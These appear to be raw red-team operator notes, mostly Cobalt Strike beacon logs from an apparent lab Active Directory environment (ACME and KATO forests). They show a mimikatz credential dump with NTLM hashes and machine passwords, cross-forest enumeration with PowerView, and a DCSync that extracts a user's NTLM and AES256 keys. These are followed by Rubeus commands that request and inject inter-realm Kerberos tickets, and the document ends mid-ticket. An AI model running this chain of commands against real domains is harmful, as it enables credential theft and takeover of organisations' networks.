	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DC$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:03 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : dc$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 26791 (00000000:000068a7)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:02 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 26592 (00000000:000067e0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:02 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:03 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44112 (00000000:0000ac50)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:03 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 26822 (00000000:000068c6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:02 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 26579 (00000000:000067d3)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:02 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
	 * Password : b4 ce 0e da 3e c9 90 88 c1 69 07 dc 31 ec 5e 0c 62 e6 17 ee 8a 6d b2 1c e7 21 5d a5 78 e8 9d 33 87 59 60 a8 e7 a2 db a3 b8 8c 2b 95 6f 09 d0 ed 3a b6 8d 44 42 2b e5 4a 67 01 ba 9c 0b d8 f2 8f ca 58 fb d1 5f 34 0d 04 ff ec f7 af 30 ce 8d b7 9b ea e8 aa 6a 2b 51 11 cf e3 3d 38 d2 fe 3b d1 a0 39 7a a4 88 d5 56 6d e2 ab 73 b3 7f b1 79 cf 92 da 47 ae f5 a5 ba bb 3f 82 2a cb e1 79 8d 6b 5b a5 0c 5f cc 63 75 62 a1 d1 5a 0f 49 3b 84 d3 76 93 76 14 0e 60 a5 bb 3d c0 9d 98 38 32 e0 dd ce 65 12 d6 89 73 b7 af 90 c3 f2 e5 1b d6 1f 9e e3 28 2a 48 e4 6e b8 3d 8b bc 84 3a b7 86 69 20 ed db be 59 83 21 60 0c 7a 40 bc 62 fb 7c af 44 97 9a d4 e3 d3 b1 68 a2 b6 55 f9 f7 bb ac b6 5a 0f 4c 3c 7c 62 a1 f4 f5 a0 86 d6 1b 6f 6d c3 19 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 23770 (00000000:00005cda)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:00 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DC$
Domain            : ACME
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:00 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : dc$
	 * Domain   : ACME.CORP
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

```





Forest KATO.ORG

```
[04/24 13:17:34] [+] received output:


GroupDomain             : kato.org
GroupName               : Foreign Kato Users
GroupDistinguishedName  : CN=Foreign Kato Users,CN=Users,DC=kato,DC=org
MemberDomain            : kato.org
MemberName              : S-1-5-21-951568539-2129440919-2691824384-1109
MemberDistinguishedName : CN=S-1-5-21-951568539-2129440919-2691824384-1109,CN=ForeignSecurityPrinci
                          pals,DC=kato,DC=org
                        
```


```
[04/24 13:19:18] beacon> powerpick ConvertFrom-SID S-1-5-21-951568539-2129440919-2691824384-1109
[04/24 13:19:18] [*] Tasked beacon to run: ConvertFrom-SID S-1-5-21-951568539-2129440919-2691824384-1109 (unmanaged)
[04/24 13:19:19] [+] host called home, sent: 138058 bytes
[04/24 13:19:22] [+] received output:
ACME\Kato User
```


```
[04/24 13:22:50] beacon> powerpick Get-DomainComputer -Domain kato.org -Properties DnsHostName
[04/24 13:22:50] [*] Tasked beacon to run: Get-DomainComputer -Domain kato.org -Properties DnsHostName (unmanaged)
[04/24 13:23:03] [+] host called home, sent: 138058 bytes
[04/24 13:23:07] [+] received output:

dnshostname 
----------- 
ad.kato.org 
jmp.kato.org
db.kato.org 
```



```
[04/24 13:29:06] beacon> powerpick Get-DomainGroupMember -Identity "ACME\Kato Users" | select MemberName
[04/24 13:29:06] [*] Tasked beacon to run: Get-DomainGroupMember -Identity "ACME\Kato Users" | select MemberName (unmanaged)
[04/24 13:29:16] [+] host called home, sent: 138058 bytes
[04/24 13:29:20] [+] received output:

MemberName
----------
lmonk     
```



lmonk



```python
[04/24 13:30:33] beacon> mimikatz lsadump::dcsync /user:lmonk /domain:acme.corp
[04/24 13:30:35] [*] Tasked beacon to run mimikatz's lsadump::dcsync /user:lmonk /domain:acme.corp command
[04/24 13:30:37] [+] host called home, sent: 815426 bytes
[04/24 13:30:38] [+] received output:
[DC] 'acme.corp' will be the domain
[DC] 'dc.acme.corp' will be the DC server
[DC] 'lmonk' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Leo Monk

** SAM ACCOUNT **

SAM Username         : lmonk
User Principal Name  : lmonk@acme.corp
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 
Password last change : 10/6/2022 12:00:06 PM
Object Security ID   : S-1-5-21-951568539-2129440919-2691824384-1108
Object Relative ID   : 1108

Credentials:
  Hash NTLM: 0c714e4e1a97b15351e90d1aaa3ac3f8    <-----------------------------------------------------------
    ntlm- 0: 0c714e4e1a97b15351e90d1aaa3ac3f8
    lm  - 0: 565e9da87b226662e169f76c51695a44

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7a246f2331895f5ac9b062630982d1c0 

* Primary:Kerberos-Newer-Keys *
    Default Salt : ACME.CORPlmonk
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9b54750fbc0e414e81f4250888fba211d9f20c30b616b3d40464aafa76e2cfb5 <-----------------------------------------------------------
      aes128_hmac       (4096) : abf28b15ad6883f96c57f0429a079e32
      des_cbc_md5       (4096) : 9267c27c2fea8fec

* Primary:Kerberos *
    Default Salt : ACME.CORPlmonk
    Credentials
      des_cbc_md5       : 9267c27c2fea8fec

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  33fb28576d0732a8993a18dc6a09cdb8
    02  7951a7d09e9ffb60b7fde7c57622cf66
    03  91cf17341e48339a7e9359fb069d665f
    04  33fb28576d0732a8993a18dc6a09cdb8
    05  7951a7d09e9ffb60b7fde7c57622cf66
    06  0f5dd55341ea568c22ecd0cb3583dc11
    07  33fb28576d0732a8993a18dc6a09cdb8
    08  4f9192ba765402d43279921e9a407032
    09  4f9192ba765402d43279921e9a407032
    10  0c4af015e7fc1f3590558d714fcf9a98
    11  c0f007e78e60bcf3ac398db003cd70d7
    12  4f9192ba765402d43279921e9a407032
    13  2df9e8b728e86b12350a723ae987500c
    14  c0f007e78e60bcf3ac398db003cd70d7
    15  eb2ebbfcfc123da6094632881266c919
    16  eb2ebbfcfc123da6094632881266c919
    17  ac4523e63be2df8cb9af22f92782e3d7
    18  874836e53b7416c828845211cb9a3bad
    19  dc9d0a1c7539e2543b6e23110dedffa4
    20  99283d6c6ac6d1942a6ffeadcff1c4b4
    21  7828aba7153310c7d2559d0e74fdb11a
    22  7828aba7153310c7d2559d0e74fdb11a
    23  9fd0187ac58c28705770fbb3a840d091
    24  0689d8c4de11f49dde5e07b0dde01c97
    25  0689d8c4de11f49dde5e07b0dde01c97
    26  e09803d8dfa4940a63735ac4021fa407
    27  7fbadae9272b52e34cdd716d8772c81b
    28  ddf69c5fc0206975760d89ab2eff1c4c
    29  abd228fa9de70be67cfb8060dea1c6c5
```



```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:lmonk /domain:acme.corp /aes256:9b54750fbc0e414e81f4250888fba211d9f20c30b616b3d40464aafa76e2cfb5 /nowrap
```


```



  ServiceName              :  krbtgt/acme.corp
  ServiceRealm             :  ACME.CORP
  UserName                 :  lmonk
  UserRealm                :  ACME.CORP
  StartTime                :  4/24/2025 1:25:05 PM
  EndTime                  :  4/24/2025 11:25:05 PM
  RenewTill                :  5/1/2025 1:25:05 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  tAptUExOf18DBXULDHxDkrPp7+NabIGVBjH1BpmVmnc=
  ASREP (key)              :  9B54750FBC0E414E81F4250888FBA211D9F20C30B616B3D40464AAFA76E2CFB5


```



```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/kato.org /domain:acme.corp /dc:dc.acme.corp /ticket: /nowrap
```


```
[*] base64(ticket.kirbi):

doI[...]w==

  ServiceName              :  krbtgt/KATO.ORG
  ServiceRealm             :  ACME.CORP
  UserName                 :  lmonk
  UserRealm                :  ACME.CORP
  StartTime                :  4/24/2025 1:26:36 PM
  EndTime                  :  4/24/2025 11:25:05 PM
  RenewTill                :  5/1/2025 1:25:05 PM
  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  WXgRSiiIuga9CZWHsAmF0g==

```




```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/kato.org /domain:kato.org /dc:dc.kato.org /ticket: /nowrap
```



```

```





-----


```
[04/24 14:30:06] beacon> powerpick Get-DomainController -Domain kato.org
[04/24 14:30:06] [*] Tasked beacon to run: Get-DomainController -Domain kato.org (unmanaged)
[04/24 14:30:09] [+] host called home, sent: 138058 bytes
[04/24 14:30:12] [+] received output:


Forest                     : kato.org
CurrentTime                : 4/24/2025 1:30:10 PM
HighestCommittedUsn        : 131298
OSVersion                  : Windows Server 2022 Datacenter
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : kato.org
IPAddress                  : 10.10.140.10
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback : 
InboundConnections         : {}
OutboundConnections        : {}
Name                       : ad.kato.org
Partitions                 : {DC=kato,DC=org, CN=Configuration,DC=kato,DC=org, 
                             CN=Schema,CN=Configuration,DC=kato,DC=org, 
                             DC=DomainDnsZones,DC=kato,DC=org...}

```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/ad.kato.org /domain:kato.org /dc:ad.kato.org /ticket:doIFTDCCBUigAwIBBaEDAgEWooIEbjCCBGphggRmMIIEYqADAgEFoQsbCUFDTUUuQ09SUKIdMBugAwIBAqEUMBIbBmtyYnRndBsIS0FUTy5PUkejggQtMIIEKaADAgEXoQMCAQeiggQbBIIEFw6giTNdbTqlrxVuS5NpRxO1iXZiZCZcHbtByPdkb6lc80a5BXhSPT/IXFthkazDND6+OQm92XIWma5I7/x7N+86Z2RKLUqZPQ2kMROGwFh2/tuByyKNWui28ISgLoUQZt6Tux+7SjIlzwzSKuD8TTUaiqmAg51LEGwmEEXirzTqAxK8Q0xLDCQ9UDFbDRFYLI27LmgemxA+ET1a/OWNu0oCHyvO+uP8/EqjHaml1//+5088RQ6sSHMUJpnqX3oJGsirI3y0Pt5Zpqy+850FijpnK0rANSDCqR1X/YDV7yrOEXXaQJxVd8eo3A3+O1EpLA2JADNPHzEwQqOEi9PnvO973V5beGukW0jw45Ud5swve2313/J6pJJ4GxOFTmEpXg2QGZ4e6/JxBMaysigVz1lJnRU7vxPK/O8dTgNAU5txQzwxYgQ0cq786yUfFJMdUR9vBvVUeazz0a9ntUEzIQxNiXdSudKupc5/i/H4HAfm/853RF/ySdv05rAsLfeRqr9bbkWGpBgnh9jT4F230sbZANmrOyVNM67L5jjrM0U9ZjgguSXGvNS5iA8LwZFITMusAmfKftt+Z2SDi9CpVCxmvFv1Ek0/gnwpO8SaSA8wBDuS2ldhGwGVVu7CaSB7wWYO3wa6lISrnN9yRsPdodQ0USLxVOguZI6Vm1dExsr83NXBTfbIBzUri5i+xiiZ1pHuI8Da5oO1hqsLt5nFkzvo+LbUAcX+hQr70/CXSkeygXDY8ttEDVv1my+VKmJQxOmqPK2FaqyGttMG+URIq2vBGSzSWFbT8KoPOrZfLXptClbgizesbzXOMdqhtbyqG5zNnTp21FBDS5dTlgOudGHey2p1N8886sa7gurcg41i6TNsbJ00i2bnLucBj4rtzjiJmKPTmOk0gAwbXAiSnDzvN9vYr49vSwGh39+lvvgWPpyO7ldDG3YMCh7PUksebW+yOYmytwSjfPCiTa+fFKcbtdj9RiOJGpPOqo++rTJ2gAx3rO+YXRQrLRcxSLKbJQkVxGdxdtsGJHgfR22o6dd1drJ+9Cz7ZPG+UvD0o7xqJKNPeEuWanQLsRosmLrcFSoD/T3+1KUYJvKPQvUNssIeo9kCRzHqAZjsaQtBjde2kbfE9oM0G3Qu2UvH9DgYQ9RcQQktn83cEdhvpM7GFyEXWKa01JuOISqCVGLDSxL9HQ2IpkW+v1rTn9e/KI+IBnAXvB91S24ku51SpRox0jzFcFl1cxwlBwy53z8rj9+ryU1OqwjJQn9Ho8oLZ9SpD/OE7v+dE25fBSP4z+quAVRak+L3RYQ1x3UNANoautRbWYmzFkBLG/zWrHXF6d6+EzBru1CtGNNr21XvzFV/52lFUk9NQrzk6xQXQuMoladPJZwSMvcAsqOByTCBxqADAgEAooG+BIG7fYG4MIG1oIGyMIGvMIGsoBswGaADAgEXoRIEEFl4EUooiLoGvQmVh7AJhdKhCxsJQUNNRS5DT1JQohIwEKADAgEBoQkwBxsFbG1vbmujBwMFAEChAAClERgPMjAyNTA0MjQxMzI2MzZaphEYDzIwMjUwNDI0MjMyNTA1WqcRGA8yMDI1MDUwMTEzMjUwNVqoCxsJQUNNRS5DT1JQqR0wG6ADAgECoRQwEhsGa3JidGd0GwhLQVRPLk9SRw== /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/ad.kato.org /domain:kato.org /dc:ad.kato.org /ticket:doIFTDCCBUigAwIBBaEDAgEWooIEbjCCBGphggRmMIIEYqADAgEFoQsbCUFDTUUuQ09SUKIdMBugAwIBAqEUMBIbBmtyYnRndBsIS0FUTy5PUkejggQtMIIEKaADAgEXoQMCAQeiggQbBIIEFw6giTNdbTqlrxVuS5NpRxO1iXZiZCZcHbtByPdkb6lc80a5BXhSPT/IXFthkazDND6+OQm92XIWma5I7/x7N+86Z2RKLUqZPQ2kMROGwFh2/tuByyKNWui28ISgLoUQZt6Tux+7SjIlzwzSKuD8TTUaiqmAg51LEGwmEEXirzTqAxK8Q0xLDCQ9UDFbDRFYLI27LmgemxA+ET1a/OWNu0oCHyvO+uP8/EqjHaml1//+5088RQ6sSHMUJpnqX3oJGsirI3y0Pt5Zpqy+850FijpnK0rANSDCqR1X/YDV7yrOEXXaQJxVd8eo3A3+O1EpLA2JADNPHzEwQqOEi9PnvO973V5beGukW0jw45Ud5swve2313/J6pJJ4GxOFTmEpXg2QGZ4e6/JxBMaysigVz1lJnRU7vxPK/O8dTgNAU5txQzwxYgQ0cq786yUfFJMdUR9vBvVUeazz0a9ntUEzIQxNiXdSudKupc5/i/H4HAfm/853RF/ySdv05rAsLfeRqr9bbkWGpBgnh9jT4F230sbZANmrOyVNM67L5jjrM0U9ZjgguSXGvNS5iA8LwZFITMusAmfKftt+Z2SDi9CpVCxmvFv1Ek0/gnwpO8SaSA8wBDuS2ldhGwGVVu7CaSB7wWYO3wa6lISrnN9yRsPdodQ0USLxVOguZI6Vm1dExsr83NXBTfbIBzUri5i+xiiZ1pHuI8Da5oO1hqsLt5nFkzvo+LbUAcX+hQr70/CXSkeygXDY8ttEDVv1my+VKmJQxOmqPK2FaqyGttMG+URIq2vBGSzSWFbT8KoPOrZfLXptClbgizesbzXOMdqhtbyqG5zNnTp21FBDS5dTlgOudGHey2p1N8886sa7gurcg41i6TNsbJ00i2bnLucBj4rtzjiJmKPTmOk0gAwbXAiSnDzvN9vYr49vSwGh39+lvvgWPpyO7ldDG3YMCh7PUksebW+yOYmytwSjfPCiTa+fFKcbtdj9RiOJGpPOqo++rTJ2gAx3rO+YXRQrLRcxSLKbJQkVxGdxdtsGJHgfR22o6dd1drJ+9Cz7ZPG+UvD0o7xqJKNPeEuWanQLsRosmLrcFSoD/T3+1KUYJvKPQvUNssIeo9kCRzHqAZjsaQtBjde2kbfE9oM0G3Qu2UvH9DgYQ9RcQQktn83cEdhvpM7GFyEXWKa01JuOISqCVGLDSxL9HQ2IpkW+v1rTn9e/KI+IBnAXvB91S24ku51SpRox0jzFcFl1cxwlBwy53z8rj9+ryU1OqwjJQn9Ho8oLZ9SpD/OE7v+dE25fBSP4z+quAVRak+L3RYQ1x3UNANoautRbWYmzFkBLG/zWrHXF6d6+EzBru1CtGNNr21XvzFV/52lFUk9NQrzk6xQXQuMoladPJZwSMvcAsqOByTCBxqADAgEAooG+BIG7fYG4MIG1oIGyMIGvMIGsoBswGaADAgEXoRIEEFl4EUooiLoGvQmVh7AJhdKhCxsJQUNNRS5DT1JQohIwEKADAgEBoQkwBxsFbG1vbmujBwMFAEChAAClERgPMjAyNTA0MjQxMzI2MzZaphEYDzIwMjUwNDI0MjMyNTA1WqcRGA8yMDI1MDUwMTEzMjUwNVqoCxsJQUNNRS5DT1JQqR0wG6ADAgECoRQwEhsGa3JidGd0GwhLQVRPLk9SRw== /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:lmonk  /domain:kato.org /password:FakePass /ticket:doIFYDCCBVygAwIBBaEDAgEWooIEcjCCBG5hggRqMIIEZqADAgEFoQobCEtBVE8uT1JHoh4wHKADAgECoRUwExsEY2lmcxsLYWQua2F0by5vcmejggQxMIIELaADAgESoQMCAQOiggQfBIIEG0iDxEvnVTw/G/ARyOtSLIJVz7DzVVbT6ZnduEZkdsz5+oSbrdpfYFwYxLto3lg1E4o4SNihPpKBVBvUEX2mdipr0v+Kap3hSqVs7gTp3GGEYEiA36n6bJAZFKFPwND4vIOIwXoT5GtOH85ZthR42o8wKcnlRnAgpNMPXHxk7yKXoHMjDOKzAD4qSiTYT6r1JuEn1Ks41iqAcCmdeT2vsbsVPYFB7Pf42vo7ehZwEpaAn1by0O7qaIRGB15QKdD+oCm9YPe/YROtGrwBDI1zRAzmpu8/eHO448KJu9QYaHK6VaFDJ9iUk+zFvv83r3+TrdGQupR1bWZtG1i05SzM/BmnsMfeKM2YpN2bkN7cMuPLAO6S5hKLay5fObT3UpUX5/9Wg0PeqVif25KEM1/HKrM1lr9wWoyZwg5TYtdvLbCVLSxRi2Iesvc+S2Aa7IEpLC3a7JwjGA2IC9vDNoKsTjHnd/psI3DZzDtwPvo1MNAEEcIQrPZ+Nx5YkLYC6msEcRqsuKMpUhcfpKaCkPGH3LbghxHoH3XRD59Mog3LegDlzDN56hPqEKj3+rqueNZg8S1RX+VSzlgN86lFl+itofyv/nDGoIcB27hcK1LtNTTcCofwlKhRt0sm5ZWN97M4Gdgx+kJz3tcoySKTIxOvlVbksBZ3eBjGZb95NqFNyde2URa8OTf1bm0J7JMtsGbqK1/xbW9AWx0Xmh2RbIsOcC+ErytYZc+sPfmoFyYnFJyKqaKL5mPm2qayog1x56DxHFP0LH6MZSS5JM/hBVzYdo735REzC8XUxC7GiJRHW65j6It6EWYkWX4hyblHfAp+ia8YOM+wa28d1WhFbBC0ifeDeCWmeIe3Q855LSNEM3TOtv2QuEoByzzCs7JQf31fkEAkBC9dNKIM9X/SGdB89XlUiMp5b9yJL2hovhgw6oGJCPeFdYX0JkZA8J5/+WTV6FJCn9uLHW1UP6K3lrDm16YEDSO168xjmzx1j1YdmJvW28+DfOASfLtF95vTYekP1OrBlsquq/u3UtOWMivBxOQEJgdenc/LL+NSiuzJLd4SUR7WGHCTuTYPMYHpog71sWorBY/pqGqVyUvz9sTh4y1ClyEo